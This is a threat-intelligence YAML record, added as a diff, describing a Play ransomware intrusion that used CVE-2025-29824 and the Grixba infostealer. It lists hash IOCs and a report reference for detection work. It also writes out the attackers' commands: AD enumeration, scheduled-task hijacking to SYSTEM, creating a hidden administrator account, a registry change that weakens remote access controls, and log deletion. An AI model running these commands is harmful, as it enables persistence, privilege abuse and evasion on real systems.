@@ -1,0 +1,89 @@
+description: Ransomware attackers leveraged a privilege escalation zero-day exploit
+  (CVE-2025-29824) targeting the Common Log File System Driver (clfs.sys), patched
+  on April 8, 2025. The attack involved the deployment of the Grixba infostealer and
+  occurred prior to patching.
+attribution: Balloonfly (linked to Play ransomware operation)
+malware_families:
+- Play Ransomware (PlayCrypt)
+- Grixba Infostealer
+authors:
+- GEETE
+TTPs:
+  processes:
+  - powershell.exe
+  - schtasks.exe
+  - cmd.exe
+  - net.exe
+  - reg.exe
+  commandline:
+  - powershell.exe "Import-Module ActiveDirectory; Get-ADComputer -Filter {enabled
+    -eq $true} -properties *|select comment, description, Name, DNSHostName, OperatingSystem,
+    LastLogonDate, ipv4address | Export-CSV C:\\Users\\ \\[REDACTED]\\Music\\AllWindows.csv
+    -NoTypeInformation -Encoding UTF8"
+  - schtasks /Query /xml /TN \\\\Microsoft\\\\Windows\\\\Wininet\\\\CacheTask > C:\\ProgramData\\\\CacheTask.xml
+  - schtasks /Change /RU SYSTEM /TN \\\\Microsoft\\\\Windows\\\\Wininet\\\\CacheTask
+    /TR C:\\ProgramData\\\\servtask.bat
+  - schtasks /Run /TN \\\\Microsoft\\\\Windows\\\\Wininet\\\\CacheTask
+  - net user /add LocalSvc Dc_34%gfE62cvsa
+  - powershell.exe "Add-LocalGroupMember -SID \"S-1-5-32-544\" -Member \"LocalSvc\""
+  - net localgroup Administrators LocalSvc /add
+  - reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System
+    /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+  - reg add \\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList\\"
+    /v LocalSvc" /d 0 /t REG_DWORD
+  - icacls C:\\ProgramData\\\\Events /grant Everyone:F /inheritance:e /T
+  - call C:\\ProgramData\\\\cmdpostfix.bat
+  - timeout /t 3600
+  - sc stop StorSvc
+  - sc start StorSvc
+  - del C:\\ProgramData\\\\Events\\\\Errors.evt
+  - del C:\\ProgramData\\\\Events\\\\Logs.evt
+  - del C:\\ProgramData\\\\Events\\\\Jobs.evt
+  - del C:\\ProgramData\\\\Events\\\\Tmp.evt
+  - del C:\\ProgramData\\\\Events\\\\out.zip
+  - schtasks /Create /F /xml C:\\ProgramData\\\\CacheTask.xml /TN \\\\Microsoft\\\\Windows\\\\Wininet\\\\CacheTask
+  - rmdir C:\\ProgramData\\\\Events
+  - del C:\\ProgramData\\\\CacheTask.xml
+  - del C:\\ProgramData\\\\cmdpostfix.bat
+  - del C:\\ProgramData\\\\servtask.bat
+  powershell:
+  - Import-Module ActiveDirectory; Get-ADComputer -Filter {enabled -eq $true} -properties
+    *|select comment, description, Name, DNSHostName, OperatingSystem, LastLogonDate,
+    ipv4address | Export-CSV C:\\Users\\[REDACTED]\\Music\\AllWindows.csv -NoTypeInformation
+    -Encoding UTF8
+  - Add-LocalGroupMember -SID "S-1-5-32-544" -Member "LocalSvc"
+  registry_keys:
+  - HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System
+  - HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList
+  file_activity:
+  - C:\\Users\\[REDACTED]\\Music\\AllWindows.csv
+  - C:\\ProgramData\\SkyPDF\\PDUDrv.blf
+  - C:\\ProgramData\\SkyPDF\\ClsSrv.inf
+  - C:\\ProgramData\\Events\\Errors.evt
+  - C:\\ProgramData\\Events\\Logs.evt
+  - C:\\ProgramData\\Events\\Jobs.evt
+  - C:\\ProgramData\\Events\\Tmp.evt
+  - C:\\ProgramData\\Events\\out.zip
+  - C:\\ProgramData\\CacheTask.xml
+  - C:\\ProgramData\\cmdpostfix.bat
+  - C:\\ProgramData\\servtask.bat
+  persistence:
+  - Creation of LocalSvc user and addition to the Administrators group.
+  - Modification of LocalAccountTokenFilterPolicy registry key.
+  - Scheduled task creation (CacheTask)
+  pipes: []
+  process_relations: []
+IOCs:
+- 6030c4381b8b5d5c5734341292316723a89f1bdbd2d10bb67c4d06b1242afd05
+- 858efe4f9037e5efebadaaa70aa8ad096f7244c4c4aeade72c51ddad23d05bfe
+- 9c21adbcb2888daf14ef55c4fa1f41eaa6cbfbe20d85c3e1da61a96a53ba18f9
+- 6d7374b4f977f689389c7155192b5db70ee44a7645625ecf8163c00da8828388
+- b2cba01ae6707ce694073018d948f82340b9c41fb2b2bc49769f9a0be37071e1
+- 293b455b5b7e1c2063a8781f3c169cf8ef2b1d06e6b7a086b7b44f37f55729bd
+- af260c172baffd0e8b2671fd0c84e607ac9b2c8beb57df43cf5df6e103cbb7ad
+- paloaltoconfig.exe
+- fappsettingslib.dll
+- w64stdlib.dll
+reference: https://symantec-enterprise-blogs.security.com/threat-intelligence/play-ransomware-zero-day
+date_of_publication: May 07, 2025
+file_creation_date: June 13, 2025
